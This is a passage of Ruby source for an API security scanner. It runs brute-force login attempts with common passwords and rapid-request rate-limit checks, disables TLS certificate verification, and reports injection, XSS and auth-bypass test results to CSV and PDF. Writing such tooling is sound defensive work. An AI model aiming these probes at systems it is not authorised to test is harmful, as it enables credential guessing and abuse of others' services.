    end

    results[:security_test_results][:session_tests] << { status: :tested } if results[:security_test_results][:session_tests].empty?
  end

  def test_brute_force_protection(login_endpoint, results)
    # Test brute force protection with rapid login attempts
    return unless login_endpoint

    uri = URI.parse(login_endpoint[:url])
    attempts = 0
    failed_attempts = 0

    begin
      # Make 5 rapid failed login attempts
      5.times do |i|
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = (uri.scheme == 'https')
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE
        http.open_timeout = 5
        http.read_timeout = 5

        request = Net::HTTP::Post.new(uri.path)
        request['Content-Type'] = 'application/json'
        request.body = { username: "test#{i}@example.com", password: COMMON_PASSWORDS[i] }.to_json

        response = http.request(request)
        attempts += 1
        failed_attempts += 1 if response.code.to_i >= 400
      end

      # Check if all attempts went through
      if failed_attempts == 5
        results[:security_test_results][:brute_force_tests] << {
          test: "Brute force protection",
          status: :warning,
          message: "No rate limiting detected after 5 failed attempts",
          severity: :medium
        }

        results[:warnings] << {
          type: "Missing Brute Force Protection",
          message: "Login endpoint allows rapid failed authentication attempts",
          recommendation: "Implement account lockout or rate limiting after failed login attempts"
        }
        results[:security_score] -= 15
      else
        results[:security_test_results][:brute_force_tests] << {
          test: "Brute force protection",
          status: :pass,
          message: "Brute force protection appears to be in place"
        }
      end
    rescue StandardError => e
      results[:security_test_results][:brute_force_tests] << {
        test: "Brute force protection",
        status: :error,
        message: "Error testing: #{e.message}"
      }
    end
  end

  def test_rate_limiting(endpoints, base_url, auth_token, results)
    # Test rate limiting by making rapid requests
    test_endpoint = endpoints.find { |e| e[:method] == "GET" }
    return unless test_endpoint

    path = test_endpoint[:path].gsub(/\{[^}]+\}/, '1')
    url = "#{base_url}#{path}"

    rate_limited = false
    attempts = 0

    begin
      # Make 10 rapid requests
      10.times do
        response = make_request(url, test_endpoint[:method], auth_token, nil)
        attempts += 1

        if response[:status_code] == 429
          rate_limited = true
          break
        end
      end

      if rate_limited
        results[:security_test_results][:rate_limit_tests] << {
          test: "Rate limiting",
          status: :pass,
          message: "Rate limiting detected after #{attempts} requests"
        }
      else
        results[:security_test_results][:rate_limit_tests] << {
          test: "Rate limiting",
          status: :warning,
          message: "No rate limiting detected after #{attempts} requests",
          severity: :low
        }

        results[:warnings] << {
          type: "No Rate Limiting",
          message: "Endpoint allows #{attempts} rapid requests without rate limiting",
          recommendation: "Implement rate limiting to prevent API abuse"
        }
        results[:security_score] -= 5
      end
    rescue StandardError => e
      results[:security_test_results][:rate_limit_tests] << {
        test: "Rate limiting",
        status: :error,
        message: "Error testing: #{e.message}"
      }
    end
  end

  def make_request(url, method, auth_token = nil, body = nil, content_type = 'application/json', extra_headers = {})
    uri = URI.parse(url)

    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = (uri.scheme == 'https')
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.open_timeout = 5
    http.read_timeout = 5

    request_class = case method.upcase
                    when "GET" then Net::HTTP::Get
                    when "POST" then Net::HTTP::Post
                    when "PUT" then Net::HTTP::Put
                    when "PATCH" then Net::HTTP::Patch
                    when "DELETE" then Net::HTTP::Delete
                    when "HEAD" then Net::HTTP::Head
                    when "OPTIONS" then Net::HTTP::Options
                    else Net::HTTP::Get
                    end

    request = request_class.new(uri.request_uri)
    request['Accept'] = 'application/json'
    request['User-Agent'] = 'SecTools Security Scanner'

    # Add authentication
    if auth_token
      request['Authorization'] = auth_token.start_with?('Bearer ') ? auth_token : "Bearer #{auth_token}"
    end

    # Add extra headers for bypass testing
    extra_headers.each do |key, value|
      request[key] = value
    end

    # Add body for POST/PUT/PATCH
    if body
      request['Content-Type'] = content_type
      request.body = body.is_a?(String) ? body : body.to_json
    elsif ["POST", "PUT", "PATCH"].include?(method.upcase)
      request['Content-Type'] = content_type
      request.body = '{}'
    end

    response = http.request(request)

    {
      status_code: response.code.to_i,
      body: response.body,
      headers: response.to_hash
    }
  rescue StandardError => e
    {
      status_code: 0,
      body: nil,
      error: e.message,
      headers: {}
    }
  end

  # ============================================================================
  # EXPORT METHODS (CSV & PDF)
  # ============================================================================

  def to_csv(results)
    require 'csv'

    CSV.generate do |csv|
      # Header
      csv << ["API Security Assessment Report"]
      csv << ["Generated", Time.now.strftime("%Y-%m-%d %H:%M:%S")]
      csv << ["API", results[:spec_info][:title]]
      csv << ["Version", results[:spec_info][:version]]
      csv << ["Base URL", results[:base_url]]
      csv << ["Security Score", results[:security_score]]
      csv << ["Grade", results[:grade]]
      csv << ["Risk Level", results[:risk_level].to_s.upcase]
      csv << []

      # Vulnerabilities
      if results[:vulnerabilities].any?
        csv << ["CRITICAL VULNERABILITIES"]
        csv << ["Severity", "Type", "Endpoint", "Message", "Impact"]
        results[:vulnerabilities].each do |vuln|
          csv << [
            vuln[:severity].to_s.upcase,
            vuln[:type],
            vuln[:endpoint] || "N/A",
            vuln[:message],
            vuln[:impact] || ""
          ]
        end
        csv << []
      end

      # Security Test Details
      if results[:security_test_results].present?
        csv << ["SECURITY VULNERABILITY TEST RESULTS"]
        csv << []

        # IDOR Tests
        if results[:security_test_results][:idor_tests].any?
          csv << ["IDOR (Insecure Direct Object Reference) Tests"]
          csv << ["Endpoint", "Test ID", "Status", "Message"]
          results[:security_test_results][:idor_tests].each do |test|
            csv << [
              test[:endpoint] || "N/A",
              test[:test_id] || "N/A",
              test[:status].to_s,
              test[:message] || "Tested"
            ]
          end
          csv << []
        end

        # SQL Injection Tests
        if results[:security_test_results][:sql_injection_tests].any?
          csv << ["SQL Injection Tests"]
          csv << ["Endpoint", "Payload", "Status", "Message"]
          results[:security_test_results][:sql_injection_tests].each do |test|
            csv << [
              test[:endpoint] || "N/A",
              test[:payload] || "N/A",
              test[:status].to_s,
              test[:message] || "Tested"
            ]
          end
          csv << []
        end

        # JSON Injection Tests
        if results[:security_test_results][:json_injection_tests].any?
          csv << ["JSON/NoSQL Injection Tests"]
          csv << ["Endpoint", "Payload", "Status", "Message"]
          results[:security_test_results][:json_injection_tests].each do |test|
            csv << [
              test[:endpoint] || "N/A",
              test[:payload] || "N/A",
              test[:status].to_s,
              test[:message] || "Tested"
            ]
          end
          csv << []
        end

        # XSS Tests
        if results[:security_test_results][:xss_tests].any?
          csv << ["Cross-Site Scripting (XSS) Tests"]
          csv << ["Endpoint", "Payload", "Status", "Message"]
          results[:security_test_results][:xss_tests].each do |test|
            csv << [
              test[:endpoint] || "N/A",
              test[:payload] || "N/A",
              test[:status].to_s,
              test[:message] || "Tested"
            ]
          end
          csv << []
        end

        # Command Injection Tests
        if results[:security_test_results][:command_injection_tests].any?
          csv << ["Command Injection Tests"]
          csv << ["Endpoint", "Payload", "Status", "Message"]
          results[:security_test_results][:command_injection_tests].each do |test|
            csv << [
              test[:endpoint] || "N/A",
              test[:payload] || "N/A",
              test[:status].to_s,
              test[:message] || "Tested"
            ]
          end
          csv << []
        end

        # Authentication Bypass Tests
        if results[:security_test_results][:auth_bypass_tests].any?
          csv << ["Authentication Bypass Tests"]
          csv << ["Endpoint", "Technique", "Status", "Message"]
          results[:security_test_results][:auth_bypass_tests].each do |test|
            csv << [
              test[:endpoint] || "N/A",
              test[:technique] ? "#{test[:technique][:header]}: #{test[:technique][:value]}" : "N/A",
              test[:status].to_s,
              test[:message] || "Tested"
            ]
          end
          csv << []
        end

        # Session Management Tests
        if results[:security_test_results][:session_tests].any?
          csv << ["Session Management Tests"]
          csv << ["Test", "Status", "Message"]
          results[:security_test_results][:session_tests].each do |test|
            csv << [
              test[:test] || "Session Tests",
              test[:status].to_s,
              test[:message] || "Completed"
            ]
          end
          csv << []
        end

        # Brute Force Tests
        if results[:security_test_results][:brute_force_tests].any?
          csv << ["Brute Force Protection Tests"]
          csv << ["Test", "Status", "Message"]
          results[:security_test_results][:brute_force_tests].each do |test|
            csv << [
              test[:test] || "Brute Force",
              test[:status].to_s,
              test[:message] || "Completed"
            ]
          end
          csv << []
        end

        # Rate Limiting Tests
        if results[:security_test_results][:rate_limit_tests].any?
          csv << ["Rate Limiting Tests"]
          csv << ["Test", "Status", "Message"]
          results[:security_test_results][:rate_limit_tests].each do |test|
            csv << [
              test[:test] || "Rate Limiting",
              test[:status].to_s,
              test[:message] || "Completed"
            ]
          end
          csv << []
        end
      end

      # Recommendations
      if results[:recommendations].any?
        csv << ["RECOMMENDATIONS"]
        results[:recommendations].each_with_index do |rec, index|
          csv << ["#{index + 1}. #{rec}"]
        end
      end
    end
  end

  def to_pdf(results)
    require 'prawn'

    Prawn::Document.new do |pdf|
      # Title
      pdf.text "API Security Assessment Report", size: 24, style: :bold
      pdf.move_down 10
      pdf.text "Generated: #{Time.now.strftime('%Y-%m-%d %H:%M:%S')}", size: 10
      pdf.move_down 20

      # Summary Box
      pdf.stroke_bounds do
        pdf.bounding_box([10, pdf.cursor - 10], width: pdf.bounds.width - 20, height: 120) do
          pdf.text "API Information", size: 14, style: :bold
          pdf.move_down 5
          pdf.text "Title: #{results[:spec_info][:title]}"
          pdf.text "Version: #{results[:spec_info][:version]}"
          pdf.text "Base URL: #{results[:base_url]}"
          pdf.move_down 10

          # Security Score with color
          score_color = results[:security_score] >= 80 ? '00FF00' :
                        results[:security_score] >= 60 ? 'FFFF00' : 'FF0000'
          pdf.text "Security Score: #{results[:security_score]} (Grade: #{results[:grade]})",
                   size: 16, style: :bold, color: score_color
          pdf.text "Risk Level: #{results[:risk_level].to_s.upcase}", size: 12, style: :bold
        end
      end
      pdf.move_down 20

      # Vulnerabilities
      if results[:vulnerabilities].any?
        pdf.text "Critical Vulnerabilities Found", size: 16, style: :bold, color: 'FF0000'
        pdf.move_down 10

        results[:vulnerabilities].each do |vuln|
          pdf.stroke_bounds do
            pdf.bounding_box([10, pdf.cursor - 10], width: pdf.bounds.width - 20) do
              pdf.text vuln[:type], size: 12, style: :bold
              pdf.text "Severity: #{vuln[:severity].to_s.upcase}", color: 'FF0000'
              pdf.text "Endpoint: #{vuln[:endpoint]}" if vuln[:endpoint]
              pdf.text "Message: #{vuln[:message]}"
              pdf.text "Impact: #{vuln[:impact]}" if vuln[:impact]
            end
          end
          pdf.move_down 10
        end
      end

      # Security Test Results Summary
      if results[:security_test_results].present? && results[:security_test_results].values.any?(&:present?)
        pdf.start_new_page
        pdf.text "Security Vulnerability Test Results", size: 18, style: :bold
        pdf.move_down 15

        test_categories = [
          { key: :idor_tests, title: "IDOR Tests" },
          { key: :sql_injection_tests, title: "SQL Injection Tests" },
          { key: :json_injection_tests, title: "JSON/NoSQL Injection Tests" },
          { key: :xml_injection_tests, title: "XML/XXE Injection Tests" },
          { key: :command_injection_tests, title: "Command Injection Tests" },
          { key: :xss_tests, title: "XSS Tests" },
          { key: :auth_bypass_tests, title: "Authentication Bypass Tests" },
          { key: :session_tests, title: "Session Management Tests" },
          { key: :brute_force_tests, title: "Brute Force Protection Tests" },
          { key: :rate_limit_tests, title: "Rate Limiting Tests" }
        ]

        test_categories.each do |category|
          tests = results[:security_test_results][category[:key]]
          next unless tests&.any?

          pdf.text category[:title], size: 14, style: :bold
          pdf.move_down 5

          tests.each do |test|
            status_symbol = case test[:status]
                           when :vulnerable then "✗"
                           when :warning then "⚠"
                           when :pass then "✓"
                           when :tested then "✓"
                           else "•"
                           end

            status_color = case test[:status]
                          when :vulnerable then 'FF0000'
                          when :warning then 'FFA500'
                          when :pass then '00FF00'
                          else '000000'
                          end

            test_line = "#{status_symbol} "
            test_line += "#{test[:endpoint]} - " if test[:endpoint]
            test_line += "#{test[:test]} - " if test[:test]
            test_line += test[:message] || "Tested #{test[:count]} endpoints" rescue "Completed"

            pdf.text test_line, size: 10, color: status_color
          end
          pdf.move_down 10
        end
      end

      # Recommendations
      if results[:recommendations].any?
        pdf.start_new_page
        pdf.text "Recommendations", size: 18, style: :bold
        pdf.move_down 15

        results[:recommendations].each_with_index do |rec, index|
          pdf.text "#{index + 1}. #{rec}", size: 11
          pdf.move_down 8
        end
      end

      # Footer
      pdf.number_pages "Page <page> of <total>", at: [pdf.bounds.right - 150, 0], align: :right, size: 9
    end.render
  end
end

# ============================================================================
# TOOL REGISTRATION
# ============================================================================
ApiSchemaSecurityReviewerTool.register!
